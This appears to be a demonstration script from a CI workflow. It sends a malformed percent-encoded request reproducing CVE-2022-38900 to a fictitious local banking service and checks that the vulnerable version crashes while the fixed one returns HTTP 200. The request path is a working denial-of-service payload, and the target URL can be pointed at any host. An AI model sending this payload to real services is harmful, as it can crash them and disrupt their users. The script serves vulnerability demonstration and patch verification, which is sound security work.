// Cliente HTTP independente do servidor. A demonstração usa apenas o serviço
// bancário fictício iniciado localmente pelo workflow.
const [scenario, baseUrl = "http://127.0.0.1:3000"] = process.argv.slice(2);

if (!["vulnerable", "fixed"].includes(scenario)) {
  console.error("[ataque] Uso: node scripts/demo-attack.mjs <vulnerable|fixed> [base-url]");
  process.exit(2);
}

// Sequência malformada registrada no relato da CVE-2022-38900.
const requestPath = "/payment?reference=%ea%ba%5a%ba";
const target = new URL(requestPath, baseUrl);
const timeoutMs = 3_000;
const startedAt = new Date();
const startedMs = Date.now();
const logLines = [];
let response;
let responseBody = "";
let failure;

function log(message) {
  logLines.push(message);
  console.log(message);
}

log("[ataque] Início da demonstração externa");
log(`[ataque] Cenário: ${scenario}`);
log(`[ataque] Destino: ${target.origin}`);
log(`[ataque] Requisição: GET ${target.pathname}${target.search}`);
log(`[ataque] Timeout do cliente: ${timeoutMs} ms`);
log(`[ataque] Início (UTC): ${startedAt.toISOString()}`);

try {
  // fetch envia uma requisição HTTP real; o cliente não importa o pacote testado.
  response = await fetch(target, { signal: AbortSignal.timeout(timeoutMs) });
  responseBody = await response.text();
} catch (error) {
  failure = error;
}

const durationMs = Date.now() - startedMs;
const expectedProcessCrash = scenario === "vulnerable";
const observedConnectionFailure = Boolean(failure);
const expectedHttpResponse = scenario === "fixed" && response?.status === 200;
const clientObservationMatches = expectedProcessCrash
  ? observedConnectionFailure
  : expectedHttpResponse;

if (response) {
  log(`[ataque] Resposta HTTP: ${response.status} ${response.statusText}`);
  log(`[ataque] Corpo: ${responseBody.slice(0, 1000) || "<vazio>"}`);
}
if (failure) {
  log(`[ataque] A requisição falhou após ${durationMs} ms.`);
  log(`[ataque] Erro: ${failure.stack || failure}`);
} else {
  log(`[ataque] A requisição terminou em ${durationMs} ms.`);
}
log(`[ataque] Esperado: ${expectedProcessCrash ? "conexão interrompida pelo processo vulnerável" : "resposta HTTP 200 do processo corrigido"}`);
log(`[ataque] Observação do cliente: ${clientObservationMatches ? "corresponde ao esperado" : "inesperada"}`);

const observed = failure ? `Conexão interrompida (${failure.name})` : `HTTP ${response.status}`;
const expected = expectedProcessCrash
  ? "O container vulnerável encerra após a exceção"
  : "O cenário corrigido responde com HTTP 200";
const section = [
  `### Resultado da demonstração — ${scenario}`,
  "",
  "| Campo | Resultado |",
  "|---|---|",
  `| CVE | CVE-2022-38900 |`,
  `| Requisição | \`GET ${target.pathname}${target.search}\` |`,
  `| Duração | ${durationMs} ms |`,
  `| Observado | ${observed} |`,
  `| Esperado | ${expected} |`,
  `| Veredito do cliente | **${clientObservationMatches ? "Conforme esperado" : "Inesperado"}** |`,
  "",
  "#### Log do cliente",
  "",
  "```shell",
  ...logLines,
  "```",
  "",
  "O workflow também verifica o estado do container e apresenta abaixo o log do servidor.",
  ""
].join("\n");

console.log(`[ataque] Veredito: ${clientObservationMatches ? "CONFORME ESPERADO" : "INESPERADO"}`);
if (process.env.GITHUB_STEP_SUMMARY) {
  const { appendFile } = await import("node:fs/promises");
  await appendFile(process.env.GITHUB_STEP_SUMMARY, section);
}

// A verificação definitiva do encerramento é feita pelo workflow via docker inspect.
if (!clientObservationMatches) process.exitCode = 1;
